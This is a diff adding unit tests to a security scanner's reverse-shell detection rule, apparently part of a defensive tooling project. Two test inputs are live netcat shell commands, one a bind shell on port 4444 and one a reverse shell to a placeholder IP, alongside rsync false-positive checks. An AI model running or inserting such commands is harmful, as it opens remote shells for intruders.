@@ -357,6 +357,28 @@ class TestRuleH006ReverseShell:
         ctx = _ctx(content=b"echo 'hello world'")
         assert _r_reverse_shell(ctx, "H006") is None
 
+    def test_nc_l_listener_triggers(self) -> None:
+        ctx = _ctx(content=b"nc -l -p 4444 -e /bin/sh")
+        assert _r_reverse_shell(ctx, "H006") is not None
+
+    def test_sudo_nc_e_still_triggers(self) -> None:
+        ctx = _ctx(content=b"sudo nc -e /bin/bash 1.2.3.4 4444")
+        assert _r_reverse_shell(ctx, "H006") is not None
+
+    def test_rsync_e_ssh_no_false_positive(self) -> None:
+        ctx = _ctx(content=b"rsync -e ssh -a src/ user@host:dst/")
+        assert _r_reverse_shell(ctx, "H006") is None
+
+    def test_rsync_e_custom_port_no_false_positive(self) -> None:
+        ctx = _ctx(
+            content=b'rsync -aHAX -e "ssh -p 2222" /data/ backup@remote:/data/'
+        )
+        assert _r_reverse_shell(ctx, "H006") is None
+
+    def test_rsync_full_path_no_false_positive(self) -> None:
+        ctx = _ctx(content=b"/usr/bin/rsync -e ssh --delete src/ dst/")
+        assert _r_reverse_shell(ctx, "H006") is None
+
 
 class TestRuleH007Privesc:
     def test_sudo_i_triggers(self) -> None:
